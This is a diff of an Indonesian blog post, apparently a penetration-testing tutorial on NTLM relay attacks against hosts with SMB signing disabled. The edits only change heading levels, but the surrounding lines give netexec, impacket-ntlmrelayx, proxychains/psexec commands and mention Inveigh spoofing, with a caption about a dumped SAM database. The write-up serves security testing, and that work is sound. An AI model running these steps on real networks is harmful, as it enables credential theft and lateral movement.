@@ -12,7 +12,7 @@ image:
 
 Ketika pengaturan `Signing` pada protokol SMB (Server Message Block) memiliki pengaturan `False` atau dinonaktifkan, maka data yang dikirim antar klien dan server tidak diverifikasi. Sehingga komputer yang menjalankan konfigurasi **SMB Signing False** akan rentan terhadap serangan **NTLM Relay**.
 
-## Let's Do It
+# Let's Do It
 
 ```bash
 netexec smb <IP_SEGMENT>/24 --gen-relay-list vuln-ntlm.txt
@@ -20,7 +20,7 @@ netexec smb <IP_SEGMENT>/24 --gen-relay-list vuln-ntlm.txt
 
 ![Netexec Detect All Vulnerable Hosts](/images/2024-11-23-ntlm-relay-attack-vulnerable-host.png)
 
-### 1. Wait and See or Trigger It
+## 1. Wait and See or Trigger It
 
 ```bash
 sudo impacket-ntlmrelayx -tf vuln-ntlm.txt -smb2support --ipv6 -debug
@@ -52,7 +52,7 @@ Jika berhasil, maka `impacket-ntlmrelayx` yang dijalankan tadi akan menghasilkan
 
 ![SAM Pwnd!](/images/2024-11-23-ntlm-relay-attack-sam-pwnd.png)
 
-#### Optional: Create Relay as Proxy Connection (Socks)
+### Optional: Create Relay as Proxy Connection (Socks)
 
 ```bash
 sudo impacket-ntlmrelayx -tf vuln-ntlm.txt -smb2support --ipv6 -debug -socks
@@ -77,7 +77,7 @@ Atau.
 proxychains4 -q impacket-psexec 'domain.local/anyuser$':'wrongpass'@<TARGET_MACHINE>
 ```
 
-### 2. Spoof via Compromised Machine
+## 2. Spoof via Compromised Machine
 
 Setelah membaca dari sumber [ini](https://cloud.tencent.com/developer/article/1956335), Kita juga dapat melakukannya meskipun kondisinya itu _cross-network_, dengan cara melakukan Spoofing menggunakan [Inveigh](https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.11) (dengan catatan, Spoof melalui mesin yang sudah _compromised_).
 
